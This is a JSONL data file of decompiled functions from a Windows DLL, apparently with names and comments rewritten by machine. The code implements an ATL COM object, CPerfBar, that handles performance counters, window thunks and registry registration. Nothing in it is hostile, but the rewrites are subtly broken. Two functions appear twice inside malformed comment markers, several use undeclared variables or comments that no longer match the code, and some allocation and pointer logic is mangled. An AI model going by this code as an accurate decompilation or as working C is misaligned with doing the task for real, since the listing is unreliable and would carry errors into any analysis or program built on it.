{"Function Name": "FUN_10011e80", "Address": "10011e80", "Source Code": "void FUN_10011e80(int input_param)\n{\n    void *saved_exception_list = current_exception_list; \n    current_exception_list = &saved_exception_list; \n    \n    (**(code **)(**(int **)(input_param + 0x38) + 8))\n    (*(int **)(input_param + 0x38), data_value ^ (uint)&modified_stack_value); \n    current_exception_list = saved_exception_list; \n}"}
{"Function Name": "FUN_10011ec0", "Address": "10011ec0", "Source Code": "void FUN_10011ec0(int input_param)\n{\n    \n    void *current_exception_list = exception_list;\n    \n    \n    exception_list = &current_exception_list;\n    \n    \n    \n    \n    \n    \n    (**(code **)(**(int **)(input_param + 0x38) + 4))\n    (*(int **)(input_param + 0x38), constant_value ^ (uint)&stack_variable);\n    \n    \n    exception_list = current_exception_list;\n}"}
{"Function Name": "FUN_10011f90", "Address": "10011f90", "Source Code": "int FUN_10011f90(int *input_array, int *condition_array, int **output_pointer)\n{\n    \n    if (output_pointer == (int **)0x0) {\n        return -0x7fffbffd; \n    }\n    \n    *output_pointer = (int *)0x0; \n    \n    \n    if (((condition_array[0] == 0) && (condition_array[1] == 0)) && (condition_array[2] == 0xc0) && (condition_array[3] == 0x46000000)) {\n        *output_pointer = input_array; \n        \n        \n        if ((undefined **)*input_array == ATL::CComAggObject<class_CPerfBar>::vftable) {\n            input_array[1]++; \n            return 0; \n        }\n        \n        \n        (*(code *)((undefined **)*input_array)[1])(input_array);\n        return 0; \n    }\n    \n    \n    return FUN_1000f650((int)(input_array + 2), 0x100482b0, condition_array, output_pointer);\n}"}
{"Function Name": "FUN_10012050", "Address": "10012050", "Source Code": "void FUN_10012050(int input_address)\n{\n    \n    *(int *)(input_address + 4) += 1;\n}"}
{"Function Name": "FUN_100120d0", "Address": "100120d0", "Source Code": "void FUN_100120d0(int input_address)\n{\n    \n    *(int *)(input_address + 0x38) += 1;\n}"}
{"Function Name": "FUN_100120f0", "Address": "100120f0", "Source Code": "void __thiscall FUN_100120f0(void *context, size_t input_param)\n{\n    \n    int result = FUN_10025334(input_param);\n    \n    \n    if (result != 0) {\n        \n        *(int *)context = result;\n        return; \n    }\n    \n    \n    FUN_10007c20(0x8007000e);\n    \n    \n    ((code *)swi(3))();\n}"}
{"Function Name": "FUN_10012120", "Address": "10012120", "Source Code": "\\*\nundefined4 * __thiscall FUN_10012120(void *this, byte inputByte)\n{\n    int *intPointer; \n    uint computedValue; \n    \n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    ExceptionList = &ExceptionList; \n    \n    \n    *(undefined ***)this = ATL::CComAggObject<class_CPerfBar>::vftable;\n    \n    \n    *(undefined4 *)((int)this + 4) = 0xc0000001;\n    \n    LOCK(); \n    \n    *(int *)(DAT_100504dc + 8) = *(int *)(DAT_100504dc + 8) - 1;\n    UNLOCK(); \n    \n    \n    FUN_10010210((int)this + 0x60);\n    \n    \n    intPointer = *(int **)((int)this + 0x58);\n    \n    \n    if (intPointer != (int *)0x0) {\n        (**(code **)(*intPointer + 8))(intPointer, computedValue);\n    }\n    \n    \n    FUN_1000fe70((undefined4 *)((int)this + 0x44));\n    \n    \n    if (*(int **)((int)this + 0x30) != (int *)0x0) {\n        _AtlThunk_FreeData_4(*(int **)((int)this + 0x30));\n    }\n    \n    \n    if ((inputByte & 1) != 0) {\n        FUN_10013ceb(this);\n    }\n    \n    \n    return (undefined4 *)this;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10012120(void *this, byte inputByte)\n{\n    int *intPointer;\n    uint computedValue;\n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    ExceptionList = &ExceptionList;\n    *(undefined ***)this = ATL::CComAggObject<class_CPerfBar>::vftable;\n    *(undefined4 *)((int)this + 4) = 0xc0000001;\n    LOCK();\n    *(int *)(DAT_100504dc + 8) = *(int *)(DAT_100504dc + 8) - 1;\n    UNLOCK();\n    FUN_10010210((int)this + 0x60);\n    intPointer = *(int **)((int)this + 0x58);\n    if (intPointer != (int *)0x0) {\n        (**(code **)(*intPointer + 8))(intPointer, computedValue);\n    }\n    FUN_1000fe70((undefined4 *)((int)this + 0x44));\n    if (*(int **)((int)this + 0x30) != (int *)0x0) {\n        _AtlThunk_FreeData_4(*(int **)((int)this + 0x30));\n    }\n    if ((inputByte & 1) != 0) {\n        FUN_10013ceb(this);\n    }\n    return (undefined4 *)this;\n}"}
{"Function Name": "FUN_100121c0", "Address": "100121c0", "Source Code": "\\*\nundefined4 * __thiscall FUN_100121c0(void *object, byte flag)\n{\n    int *intPointer; \n    uint computedValue;  \n    \n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    *(undefined ***)object = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 4) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 8) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0xc) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0x10) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0x14) = ATL::CComObject<class_CPerfBar>::vftable;\n    \n    *(undefined4 *)((int)object + 0x38) = 0xc0000001;\n    LOCK(); \n    \n    *(int *)(DAT_100504dc + 8) = *(int *)(DAT_100504dc + 8) - 1;\n    UNLOCK(); \n    \n    FUN_10010210((int)object + 0x58);\n    \n    intPointer = *(int **)((int)object + 0x50);\n    \n    if (intPointer != (int *)0x0) {\n        (**(code **)(*intPointer + 8))(intPointer, computedValue);\n    }\n    \n    FUN_1000fe70((undefined4 *)((int)object + 0x3c));\n    \n    if (*(int **)((int)object + 0x28) != (int *)0x0) {\n        _AtlThunk_FreeData_4(*(int **)((int)object + 0x28));\n    }\n    \n    if ((flag & 1) != 0) {\n        FUN_10013ceb(object);\n    }\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_100121c0(void *object, byte flag)\n{\n    int *intPointer;\n    uint computedValue;\n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    *(undefined ***)object = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 4) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 8) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0xc) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0x10) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined ***)((int)object + 0x14) = ATL::CComObject<class_CPerfBar>::vftable;\n    *(undefined4 *)((int)object + 0x38) = 0xc0000001;\n    LOCK();\n    *(int *)(DAT_100504dc + 8) = *(int *)(DAT_100504dc + 8) - 1;\n    UNLOCK();\n    FUN_10010210((int)object + 0x58);\n    intPointer = *(int **)((int)object + 0x50);\n    if (intPointer != (int *)0x0) {\n        (**(code **)(*intPointer + 8))(intPointer, computedValue);\n    }\n    FUN_1000fe70((undefined4 *)((int)object + 0x3c));\n    if (*(int **)((int)object + 0x28) != (int *)0x0) {\n        _AtlThunk_FreeData_4(*(int **)((int)object + 0x28));\n    }\n    if ((flag & 1) != 0) {\n        FUN_10013ceb(object);\n    }\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10012280", "Address": "10012280", "Source Code": "void FUN_10012280(void *input_param)\n{\n    void *memory_pointer; \n    code *function_pointer; \n    \n    if (7 < *(uint *)((int)input_param + 0x1c)) {\n        memory_pointer = *(void **)((int)input_param + 8); \n        \n        \n        if (0xfff < *(uint *)((int)input_param + 0x1c) * 2 + 2 && \n            0x1f < (uint)((int)memory_pointer - 4 - *(int *)((int)memory_pointer - 4))) {\n            FUN_1001dea6(); \n            function_pointer = (code *)swi(3); \n            (*function_pointer)(); \n            return; \n        }\n        \n        FUN_10013ceb(memory_pointer); \n    }\n    \n    \n    *(undefined4 *)((int)input_param + 0x18) = 0;\n    \n    *(undefined4 *)((int)input_param + 0x1c) = 7;\n    \n    *(undefined2 *)((int)input_param + 8) = 0;\n    \n    FUN_10013ceb(input_param);\n}"}
{"Function Name": "FUN_100122f0", "Address": "100122f0", "Source Code": "void * __thiscall FUN_100122f0(void *objectInstance, byte inputParam)\n{\n    uint modifiedStackPointer; \n    int *intPointer; \n    modifiedStackPointer = dataValue ^ (uint)&stackPointer; \n    exceptionList = exceptionList; \n    functionWithOffset((int)objectInstance + 0x58); \n    intPointer = *(int **)((int)objectInstance + 0x50); \n    if (intPointer != (int *)0x0) { \n        (**(code **)(*intPointer + 8))(intPointer, modifiedStackPointer); \n    }\n    anotherFunctionWithOffset((undefined4 *)((int)objectInstance + 0x3c)); \n    if (*(int **)((int)objectInstance + 0x28) != (int *)0x0) { \n        freeDataFunction(*(int **)((int)objectInstance + 0x28)); \n    }\n    if ((inputParam & 1) != 0) { \n        FUN_10013ceb(objectInstance); \n    }\n    return objectInstance; \n}"}
{"Function Name": "FUN_10012390", "Address": "10012390", "Source Code": "undefined4 FUN_10012390(HWND param_1, undefined4 param_2, undefined4 param_3, undefined4 param_4)\n{\n    int *currentThreadIdPointer; \n    uint *allocatedDataPointer; \n    AtlThunkData_t *thunkDataPointer; \n    undefined4 returnValue; \n    code *functionPointer; \n    int *specificDataStructurePointer = (int *)0x0; \n    int **threadDataLinkedListPointer = DAT_1004eabc; \n    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n    if (threadDataLinkedListPointer != (int **)0x0) { \n        currentThreadIdPointer = (int *)GetCurrentThreadId(); \n        int **previousNodePointer = (int **)0x0; \n        do {\n            int **nextNodePointer = (int **)threadDataLinkedListPointer[2]; \n            if (threadDataLinkedListPointer[1] == currentThreadIdPointer) { \n                if (previousNodePointer != (int **)0x0) { \n                    previousNodePointer[2] = (int *)nextNodePointer; \n                }\n                DAT_1004eabc = nextNodePointer; \n                specificDataStructurePointer = *threadDataLinkedListPointer; \n                break; \n            }\n            previousNodePointer = threadDataLinkedListPointer; \n            threadDataLinkedListPointer = nextNodePointer; \n        } while (nextNodePointer != (int **)0x0); \n    }\n    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n    if (specificDataStructurePointer == (int *)0x0) { \n        return 0; \n    }\n    specificDataStructurePointer[1] = (int)param_1; \n    functionPointer = (*(code **)(*specificDataStructurePointer + 8) == FUN_10011a90) ? FUN_10012450 : (code *)(**(code **)(*specificDataStructurePointer + 8))(); \n    allocatedDataPointer = (uint *)specificDataStructurePointer[5]; \n    if (allocatedDataPointer == (uint *)0x0) { \n        allocatedDataPointer = _AtlThunk_AllocateData_0(); \n        specificDataStructurePointer[5] = (int)allocatedDataPointer; \n        if (allocatedDataPointer == (uint *)0x0) goto LAB_10012421; \n    }\n    _AtlThunk_InitData_12((int *)allocatedDataPointer, (ulong)functionPointer, specificDataStructurePointer); \nLAB_10012421:\n    thunkDataPointer = _AtlThunk_DataToCode_4((int *)specificDataStructurePointer[5]); \n    SetWindowLongW(param_1, -4, (LONG)thunkDataPointer); \n    returnValue = (*(code *)thunkDataPointer)(param_1, param_2, param_3, param_4); \n    return returnValue; \n}"}
{"Function Name": "FUN_100127d0", "Address": "100127d0", "Source Code": "void __fastcall FUN_100127d0(undefined4 input_value, undefined4 *destination_array, undefined4 *source_array)\n{\n    \n    destination_array[4] = 0;\n    destination_array[5] = 0;\n    \n    *destination_array = *source_array;\n    destination_array[1] = source_array[1];\n    destination_array[2] = source_array[2];\n    destination_array[3] = source_array[3];\n    \n    *(undefined8 *)(destination_array + 4) = *(undefined8 *)(source_array + 4);\n    \n    source_array[4] = 0;\n    source_array[5] = 7;\n    \n    *(undefined2 *)source_array = 0;\n    \n    destination_array[10] = 0;\n    destination_array[0xb] = 0;\n    \n    destination_array[6] = source_array[6];\n    destination_array[7] = source_array[7];\n    destination_array[8] = source_array[8];\n    destination_array[9] = source_array[9];\n    \n    *(undefined8 *)(destination_array + 10) = *(undefined8 *)(source_array + 10);\n    \n    source_array[10] = 0;\n    source_array[0xb] = 7;\n    \n    *(undefined2 *)(source_array + 6) = 0;\n    \n    return;\n}"}
{"Function Name": "FUN_100129f0", "Address": "100129f0", "Source Code": "void __fastcall FUN_100129f0(void **sourceArray, void **destinationArray)\n{\n    \n    if (sourceArray != destinationArray) {\n        \n        do {\n            \n            if ((void *)0x7 < sourceArray[5]) {\n                \n                void *valuePointer = *sourceArray;\n                \n                if ((0xfff < (int)sourceArray[5] * 2 + 2U) &&\n                    \n                    (valuePointer = *(void **)((int)valuePointer - 4), 0x1f < (uint)((int)valuePointer + (-4 - (int)valuePointer)))) {\n                    \n                    FUN_1001dea6();\n                    \n                    ((code *)swi(3))();\n                    return; \n                }\n                \n                FUN_10013ceb(valuePointer);\n            }\n            \n            sourceArray[4] = (void *)0x0;\n            \n            sourceArray[5] = (void *)0x7;\n            \n            *(undefined2 *)sourceArray = 0;\n            \n            sourceArray += 7;\n        } while (sourceArray != destinationArray); \n    }\n    return; \n}"}
{"Function Name": "FUN_10012a60", "Address": "10012a60", "Source Code": "void __fastcall FUN_10012a60(undefined4 *source_array, undefined4 *destination_array, undefined4 *temp_array)\n{\n    undefined4 *source_ptr = source_array + 0xb; \n    undefined4 *temp_ptr = temp_array; \n    if (source_array != destination_array) { \n        do {\n            temp_ptr[4] = 0; \n            temp_ptr[5] = 0; \n            temp_ptr[0] = source_ptr[-0xb]; \n            temp_ptr[1] = source_ptr[-10]; \n            temp_ptr[2] = source_ptr[-9]; \n            temp_ptr[3] = source_ptr[-8]; \n            *(undefined8 *)(temp_ptr + 4) = *(undefined8 *)(source_ptr + -7); \n            source_ptr[-7] = 0; \n            source_ptr[-6] = 7; \n            *(undefined2 *)(source_ptr + -0xb) = 0; \n            temp_ptr[10] = 0; \n            *(undefined4 *)((int)temp_array + (-0x30 - (int)source_array) + (int)(source_ptr + 0xc)) = 0; \n            temp_ptr[6] = source_ptr[-5]; \n            temp_ptr[7] = source_ptr[-4]; \n            temp_ptr[8] = source_ptr[-3]; \n            temp_ptr[9] = source_ptr[-2]; \n            *(undefined8 *)(temp_ptr + 10) = *(undefined8 *)(source_ptr + -1); \n            temp_ptr += 0xc; \n            source_ptr[-1] = 0; \n            *source_ptr = 7; \n            *(undefined2 *)(source_ptr + -5) = 0; \n            source_ptr += 0xc; \n        } while (source_ptr != destination_array); \n    }\n}"}
{"Function Name": "FUN_10012be0", "Address": "10012be0", "Source Code": "undefined4 __fastcall\nFUN_10012be0(undefined8 *param_1, uint param_2, undefined8 *param_3, uint param_4)\n{\n    \n    if (param_4 == 0) {\n        return 0;\n    }\n    \n    \n    if (param_1 == (undefined8 *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n        return 0x16;\n    }\n    \n    \n    if ((param_3 != (undefined8 *)0x0) && (param_4 <= param_2)) {\n        \n        FUN_10018670(param_1, param_3, param_4);\n        return 0;\n    }\n    \n    \n    _memset(param_1, 0, param_2);\n    \n    \n    if (param_3 == (undefined8 *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n    } \n    \n    else if (param_2 < param_4) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x22;\n        \n        FUN_1001de96();\n        return 0x22;\n    }\n    \n    \n    return 0x16;\n}"}
{"Function Name": "FUN_10012c80", "Address": "10012c80", "Source Code": "void __fastcall FUN_10012c80(int input_param)\n{\n    code **function_ptr_list; \n    uint modified_stack_value; \n    void *current_exception_list; \n    current_exception_list = original_exception_list; \n    modified_stack_value = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    if (*(int *)(input_param + 4) != 0) { \n        if (*(int *)(input_param + 0xc) != 0) { \n            if (input_param == -4) { \n                original_exception_list = &current_exception_list; \n                FUN_10007bf0(0xc0000005, 1); \n                ((code *)swi(3))(); \n                return; \n            }\n            function_ptr_list = *(code ***)(input_param + 0xc); \n            while (function_ptr_list != (code **)0x0) { \n                (**function_ptr_list)(function_ptr_list[1], modified_stack_value); \n                FUN_10013ceb(function_ptr_list); \n                function_ptr_list = (code **)function_ptr_list[2]; \n            }\n            *(undefined4 *)(input_param + 0xc) = 0; \n        }\n        int_pointer = *(int **)(input_param + 0x28); \n        if (int_pointer != (int *)0x0) { \n            (**(code **)(*int_pointer + 8))(int_pointer); \n        }\n        DeleteCriticalSection((LPCRITICAL_SECTION)(input_param + 0x10)); \n        *(undefined4 *)(input_param + 4) = 0; \n    }\n    original_exception_list = current_exception_list; \n    return; \n}"}
{"Function Name": "FUN_10012d60", "Address": "10012d60", "Source Code": "HRESULT __thiscall FUN_10012d60(void *this, int **inputParam)\n{\n    int **pointerToPointer; \n    uint computedValue; \n    HRESULT resultCode; \n    \n    if (inputParam == (int **)0x0) {\n        return -0x7fffbffd; \n    }\n    \n    resultCode = 0; \n    pointerToPointer = (int **)((int)this + 0x28); \n    \n    \n    computedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    if ((*pointerToPointer == (int *)0x0) &&\n        \n        (resultCode = CoCreateInstance((IID *)&DAT_1003a3b0, (LPUNKNOWN)0x0, 1, (IID *)&DAT_10048518, pointerToPointer),\n        resultCode < 0)) {\n        return resultCode; \n    }\n    \n    *inputParam = *pointerToPointer; \n    \n    (**(code **)(**pointerToPointer + 4))(*pointerToPointer, computedValue);\n    \n    return resultCode; \n}"}
{"Function Name": "FUN_10012e70", "Address": "10012e70", "Source Code": "\nvoid __fastcall FUN_10012e70(undefined4 input_param_1, LPCWSTR input_param_2, int input_param_3, undefined4 *input_param_4)\n{\n    short short_value; // Variable to hold short values\n    code *function_pointer; // Pointer to a function code\n    HMODULE module_handle; // Handle to a module\n    void **exception_list_pointer; // Pointer to a pointer for storing ExceptionList\n    uint computed_value; // Variable for storing a computed value\n    int integer_result; // Variable for storing integer results\n    DWORD module_file_name_result; // Variable for storing the result of GetModuleFileNameW\n    HMODULE retrieved_module_handle; // Handle to a module retrieved by GetModuleHandleW\n    undefined8 *undefined_pointer_8; // Pointer to an undefined 8-byte value\n    undefined4 *undefined_pointer_4; // Pointer to an undefined 4-byte value\n    short *short_pointer; // Pointer to a short value\n    undefined **virtual_table_pointer; // Local variable for storing a pointer to a virtual table\n    undefined4 local_value_4; // Local variable for storing a 4-byte value\n    void *local_pointer; // Local variable for storing a pointer\n    undefined8 local_value_8; // Local variable for storing an 8-byte value\n    undefined local_buffer [1048]; // Local buffer for storing data\n    WCHAR wide_string_buffer [260]; // Local buffer for storing a wide character string\n    uint local_computed_value; // Local variable for storing a computed value\n    void *original_exception_list; // Local variable for storing the original ExceptionList\n\n    original_exception_list = ExceptionList; // Save the current ExceptionList\n    computed_value = DAT_1004e008 ^ (uint)&stack0xfffffffc; // Compute a value using XOR\n    local_a4c = 0; // Initialize local variable to 0\n    virtual_table_pointer = ATL::CRegObject::vftable; // Assign virtual table pointer\n    local_value_4 = 0; // Initialize local variable to 0\n    exception_list_pointer = &original_exception_list; // Set ppvVar4 to point to local_10\n    local_computed_value = computed_value; // Store computed value in local_14\n\n    if (input_param_4 != (undefined4 *)0x0) { // Check if param_4 is not null\n        undefined_pointer_8 = (undefined8 *)*input_param_4; // Dereference param_4 to get the first value\n        while (undefined_pointer_8 != (undefined8 *)0x0) { // Loop until puVar9 is null\n            if ((undefined_pointer_8 != (undefined8 *)0x0) && ((undefined8 *)input_param_4[1] != (undefined8 *)0x0)) { // Check if both values are not null\n                FUN_1000d680(&local_value_4, undefined_pointer_8, (undefined8 *)input_param_4[1]); // Call FUN_1000d680 with parameters\n            }\n            input_param_4 += 2; // Move to the next pair of values in param_4\n            undefined_pointer_8 = (undefined8 *)*input_param_4; // Get the next value from param_4\n        }\n    }\n    ExceptionList = exception_list_pointer; // Restore the original ExceptionList\n    local_pointer = (void *)0x0; // Initialize local variable to null\n    integer_result = (*(code *)virtual_table_pointer[3])(&virtual_table_pointer, L\"APPID\", &DAT_10048528, computed_value); // Call a function from the virtual table\n\n    module_handle = DAT_1004fccc; // Assign a module handle\n\n    if (-1 < integer_result) { // Check if the function call was successful\n        module_file_name_result = GetModuleFileNameW(DAT_1004fccc, wide_string_buffer, 0x104); // Get the module file name\n        if (module_file_name_result == 0) { // Check if the function failed\n            FUN_1000d250(); // Call error handling function\n        } else {\n            if (module_file_name_result == 0x104) { // Check if the buffer was too small\n                FUN_1000b490(&local_pointer); // Call cleanup function\n                FUN_1000da60(&virtual_table_pointer); // Call cleanup function\n                goto LAB_10012f6b; // Jump to cleanup label\n            }\n            FUN_1000d280(&local_value_8, wide_string_buffer); // Call function to process the file name\n            if ((module_handle == (HMODULE)0x0) || (retrieved_module_handle = GetModuleHandleW((LPCWSTR)0x0), module_handle == retrieved_module_handle)) { // Check module handle\n                undefined_pointer_8 = &local_value_8; // Set puVar9 to local_a44\n                local_buffer._0_2_ = 0x22; // Initialize first two bytes of local_634\n                do {\n                    short_value = *(short *)undefined_pointer_8; // Get the current short value\n                    undefined_pointer_8 = (undefined8 *)((int)undefined_pointer_8 + 2); // Move to the next short value\n                } while (short_value != 0); // Continue until a null short is found\n                computed_value = ((int)undefined_pointer_8 - ((int)&local_value_8 + 2) >> 1) * 2 + 2; // Calculate the size of the string\n                if (computed_value != 0) { // Check if the size is not zero\n                    if (0x416 < computed_value) { // Check if the size exceeds a limit\n                        undefined_pointer_4 = (undefined4 *)FUN_100253b8(); // Call a function to get a pointer\n                        *undefined_pointer_4 = 0x22; // Set the first value to 0x22\n                        FUN_1001de96(); // Call error handling function\n                        FUN_1000b490(&local_pointer); // Call cleanup function\n                        FUN_1000da60(&virtual_table_pointer); // Call cleanup function\n                        goto LAB_10012f6b; // Jump to cleanup label\n                    }\n                    FUN_10018670((undefined8 *)(local_buffer + 2), &local_value_8, computed_value); // Call function to copy data\n                }\n                short_pointer = (short *)local_buffer; // Set psVar11 to point to local_634\n                do {\n                    short_value = *short_pointer; // Get the current short value\n                    short_pointer++; // Move to the next short value\n                } while (short_value != 0); // Continue until a null short is found\n                integer_result = (int)short_pointer - (int)(local_buffer + 2) >> 1; // Calculate the number of short values\n                wide_string_buffer[integer_result + -0x20c] = L'\\\"'; // Add a quote character to local_21c\n                if (0x417 < integer_result * 2 + 2U) { // Check if the size exceeds a limit\n                    ___report_rangecheckfailure(); // Report a range check failure\n                    function_pointer = (code *)swi(3); // Get a pointer to a function\n                    (*function_pointer)(); // Call the function\n                    return; // Exit the function\n                }\n                wide_string_buffer[integer_result + -0x20b] = L'\\0'; // Null-terminate the string\n                undefined_pointer_8 = (undefined8 *)local_buffer; // Set puVar9 to local_634\n            } else {\n                undefined_pointer_8 = &local_value_8; // Set puVar9 to local_a44\n            }\n            integer_result = FUN_1000d680(&local_value_4, (undefined8 *)L\"Module\", undefined_pointer_8); // Call function to process the module\n            if ((((int)((-(uint)(integer_result != 0) & 0x7ff8fff2) + 0x8007000e) < 0) || // Check for error conditions\n            (integer_result = FUN_1000d680(&local_value_4, (undefined8 *)L\"Module_Raw\", &local_value_8), integer_result == 0)) || // Check another condition\n            (input_param_2 == (LPCWSTR)0x0)) { // Check if param_2 is null\n                FUN_1000b490(&local_pointer); // Call cleanup function\n            } else {\n                FUN_1000dbb0(wide_string_buffer, input_param_2, L\"REGISTRY\"); // Call function to write to registry\n                FUN_1000b490(&local_pointer); // Call cleanup function\n            }\n        }\n    }\n    FUN_1000da60(&virtual_table_pointer); // Call cleanup function\nLAB_10012f6b: // Cleanup label\n    ExceptionList = original_exception_list; // Restore the original ExceptionList\n    ___security_check_cookie_4(local_computed_value ^ (uint)&stack0xfffffffc); // Perform security check\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_10013370", "Address": "10013370", "Source Code": "void FUN_10013370(int *input_param)\n{\n    void *current_exception_list = exception_list_pointer; \n    exception_list_pointer = &current_exception_list; \n    (**(code **)(*input_param + 0xc))(input_param, L\"APPID\", &appid_data, data_mask ^ (uint)&stack_variable); \n    exception_list_pointer = current_exception_list; \n}"}
{"Function Name": "FUN_100133c0", "Address": "100133c0", "Source Code": "void __fastcall FUN_100133c0(int query_handle)\n{\n    \n    int current_index = *(int *)(query_handle + 8);\n    \n    int end_index = *(int *)(query_handle + 0xc);\n    \n    if (current_index != end_index) {\n        \n        do {\n            \n            PdhRemoveCounter(*(undefined4 *)(current_index + 0x18));\n            \n            current_index += 0x1c;\n        } while (current_index != end_index); \n    }\n    \n    if (*(int *)(query_handle + 4) != 0) {\n        \n        PdhCloseQuery(*(int *)(query_handle + 4));\n    }\n    \n    *(undefined4 *)(query_handle + 4) = 0;\n    \n    FUN_100129f0(*(void ***)(query_handle + 8), *(void ***)(query_handle + 0xc));\n    \n    *(undefined4 *)(query_handle + 0xc) = *(undefined4 *)(query_handle + 8);\n}"}
{"Function Name": "FUN_100134d0", "Address": "100134d0", "Source Code": "void * __thiscall FUN_100134d0(void *object, undefined4 *input_param, void **data_array)\n{\n    \n    int index = ((int)input_param - *object) / 0x1c;\n    \n    int size = (*(int *)((int)object + 4) - *object) / 0x1c;\n    \n    if (size == 0x9249249) goto LAB_100136c4;\n    \n    uint incremented_size = size + 1;\n    \n    uint current_size = (*(int *)((int)object + 8) - *object) / 0x1c;\n    uint adjusted_size = incremented_size;\n    \n    if ((current_size <= 0x9249249 - (current_size >> 1)) && (adjusted_size = (current_size >> 1) + current_size, adjusted_size < incremented_size)) {\n        adjusted_size = incremented_size;\n    }\n    \n    current_size = adjusted_size * 0x1c;\n    \n    void **allocated_memory = (adjusted_size < 0x924924a) ? (current_size > 0xfff ? (void **)0x0 : (void **)FUN_10013cf9(current_size)) : (void **)0x0;\nLAB_100135b9:\n    \n    allocated_memory[index * 7 + 4] = (void *)0x0;\n    allocated_memory[index * 7 + 5] = (void *)0x0;\n    \n    void *current_object = data_array[1];\n    void *data_pointer_2 = data_array[2];\n    void *data_pointer_3 = data_array[3];\n    \n    void **memory_pointer = allocated_memory + index * 7;\n    *memory_pointer = *data_array;\n    memory_pointer[1] = current_object;\n    memory_pointer[2] = data_pointer_2;\n    memory_pointer[3] = data_pointer_3;\n    \n    *(undefined8 *)(allocated_memory + index * 7 + 4) = *(undefined8 *)(data_array + 4);\n    \n    data_array[4] = (void *)0x0;\n    data_array[5] = (void *)0x7;\n    *(undefined2 *)data_array = 0;\n    allocated_memory[index * 7 + 6] = data_array[6];\n    \n    undefined4 *size_pointer = *(undefined4 **)((int)object + 4);\n    undefined4 *input_pointer = *object;\n    memory_pointer = allocated_memory;\n    \n    if (input_param != size_pointer) {\n        FUN_10013860(*object, input_param, allocated_memory);\n        size_pointer = *(undefined4 **)((int)object + 4);\n        memory_pointer = allocated_memory + index * 7 + 7;\n        input_pointer = input_param;\n    }\n    \n    FUN_10013860(input_pointer, size_pointer, memory_pointer);\n    \n    if (*object == (void **)0x0) {\nLAB_10013698:\n        *(void ***)object = allocated_memory; \n        *(void ***)((int)object + 4) = allocated_memory + incremented_size * 7; \n        *(void ***)((int)object + 8) = allocated_memory + adjusted_size * 7; \n        return (void *)(*object + index * 0x1c); \n    }\n    \n    FUN_100129f0(*object, *(void ***)((int)object + 4));\n    \n    void *current_object = *object;\n    \n    if (((uint)(((*(int *)((int)object + 8) - (int)current_object) / 0x1c) * 0x1c) < 0x1000) ||\n        ((uint)((int)current_object + (-4 - (int)*(void **)((int)current_object + -4))) < 0x20)) {\n        \n        FUN_10013ceb(*(void **)((int)current_object + -4));\n        goto LAB_10013698; \n    }\n    else {\n        uint current_size = 0xffffffff; \nLAB_1001357f:\n        uint new_size = current_size + 0x23; \n        \n        if (new_size <= current_size) {\n            new_size = 0xffffffff;\n        }\n        \n        current_object = (void *)FUN_10013cf9(new_size);\n        if (current_object != (void *)0x0) {\n            \n            allocated_memory = (void **)((int)current_object + 0x23U & 0xffffffe0);\n            allocated_memory[-1] = current_object; \n            goto LAB_100135b9; \n        }\n    }\n    \n    FUN_1001dea6();\nLAB_100136c4:\n    \n    FUN_10005250();\n    \n    code *pcVar1 = (code *)swi(3);\n    return (void *)(*pcVar1)(); \n}"}
{"Function Name": "FUN_10013860", "Address": "10013860", "Source Code": "void ** __fastcall FUN_10013860(undefined4 *input_array, undefined4 *end_array, void **output_array)\n{\n    undefined4 *traverse_ptr; \n    void **output_ptr = output_array; \n    if (input_array != end_array) { \n        traverse_ptr = input_array + 5; \n        do {\n            output_ptr[4] = (void *)0x0; \n            *(undefined4 *)((int)output_array + (-0x1c - (int)input_array) + (int)(traverse_ptr + 7)) = 0; \n            output_ptr[0] = (void *)traverse_ptr[-5]; \n            output_ptr[1] = (void *)traverse_ptr[-4]; \n            output_ptr[2] = (void *)traverse_ptr[-3]; \n            output_ptr[3] = (void *)traverse_ptr[-2]; \n            *(undefined8 *)(output_ptr + 4) = *(undefined8 *)(traverse_ptr + -1); \n            traverse_ptr[-1] = 0; \n            *traverse_ptr = 7; \n            *(undefined2 *)(traverse_ptr + -5) = 0; \n            output_ptr[6] = (void *)traverse_ptr[1]; \n            output_ptr += 7; \n            traverse_ptr += 7; \n        } while (traverse_ptr != end_array); \n    }\n    FUN_100129f0(output_ptr, output_ptr); \n    return output_ptr; \n}"}
{"Function Name": "Catch_All@10013b81", "Address": "10013b81", "Source Code": "void Catch_All_10013b81(void)\n{\n    int **pointerToPointerToInt; \n    \n    pointerToPointerToInt = (int **)functionCall1((undefined4 *)(basePointer + -0x24), *(undefined4 *)(basePointer + -0x18));\n    \n    \n    functionCall2(*(void **)(basePointer + -0x34), (int *)(basePointer + -0x18), *pointerToPointerToInt);\n    \n    \n    throwException((int *)0x0, (byte *)0x0);\n    \n    \n    ((code *)softwareInterrupt(3))();\n}"}
